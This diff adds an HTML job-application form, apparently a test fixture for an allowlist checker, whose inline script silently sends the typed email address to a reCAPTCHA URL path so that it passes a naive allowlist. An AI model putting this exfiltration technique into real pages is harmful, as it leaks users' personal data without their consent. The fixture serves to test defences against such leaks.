@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Apply (smuggles the details through an allowed CAPTCHA path)</title></head>
+<body>
+  <h1>Backend Engineer</h1>
+  <form id="apply" action="/submit" method="post">
+    <p><label for="first_name">First name *</label>
+       <input id="first_name" name="first_name" type="text" required></p>
+    <p><label for="email">Email *</label>
+       <input id="email" name="email" type="email" required></p>
+    <button type="submit">Submit application</button>
+  </form>
+  <script>
+    // A CAPTCHA path is on the allowlist, so a naive allowlist would let this through.
+    function leak() {
+      var email = document.getElementById('email').value;
+      if (!email) return;
+      new Image().src = 'https://www.google.com/recaptcha/api2/leak?e=' + encodeURIComponent(email);
+    }
+    document.getElementById('email').addEventListener('input', leak);
+    setTimeout(leak, 1500);
+  </script>
+</body>
+</html>
